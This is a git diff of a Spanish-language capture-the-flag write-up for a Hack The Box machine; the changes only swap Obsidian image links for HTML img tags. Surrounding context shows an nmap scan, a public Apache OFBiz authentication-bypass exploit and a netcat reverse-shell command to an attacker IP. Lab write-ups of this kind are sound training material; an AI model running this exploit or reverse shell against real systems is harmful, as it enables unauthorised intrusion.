@@ -2,17 +2,17 @@ Primero de todo haremos un escaneo de la ip para ver que puertos estan abiertos 
 
 `sudo nmap -sV -sC --min-rate 7000 -p- -Pn 10.10.11.252 -oN escaneo`
 
-![[Pasted image 20240426090418.png]]
+<img src="Pasted image 20240426090418.png">
 
 Vemos que está corriendo una web. Entonces procediremos a realizar un fuzzing de la misma.
 Al hacerlo hemos encontrado una ruta que es `/control/login` que nos redirecciona a un apache OFBiz.
-![[Pasted image 20240426092249.png]]
+<img src="Pasted image 20240426092249.png">
 
 Vamos a intentar bypassearlo, para ello buscaremos `apache ofbiz bypass` y entraremos al primer link. (https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) y clonaremos el github.
 
 `git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git`
 
-![[Pasted image 20240426092605.png]]
+<img src="Pasted image 20240426092605.png">
 
 Ahora vamos a ejecutar el exploit. Para ello nos vamos a poner en escucha con netcat y luego ejecutaremos el exploit.
 
@@ -22,10 +22,10 @@ Y en otra terminal el exploit.
 
 `python3 exploit.py --url https://bizness.htb --cmd 'nc -c bash 10.10.14.38 4444'`
 
-![[Pasted image 20240426093645.png]]
+<img src="Pasted image 20240426093645.png">
 
 Como podemos ver tenemos el control de la máquina. Ahora nos pondremos en la carpeta del usuario y veremos que está la flag de usuario.
-![[Pasted image 20240426093845.png]]
+<img src="Pasted image 20240426093845.png">
 
 Para escalar privilegios nos situaremos en la carpeta /opt/ofbiz y analizaremos los archivos y directorios. Tras analizar detalladamente he encontrado un archivo con la ruta:
 
@@ -122,5 +122,5 @@ with open(wordlist, 'r', encoding='latin-1') as password_list:
 ````
 
 Lo ejecutamos y nos da el password.
-![[Pasted image 20240426100223.png]]
-![[Pasted image 20240426100347.png]]![[Pasted image 20240426100536.png]]
+<img src="Pasted image 20240426100223.png">
+<img src="Pasted image 20240426100347.png]]![[Pasted image 20240426100536.png">
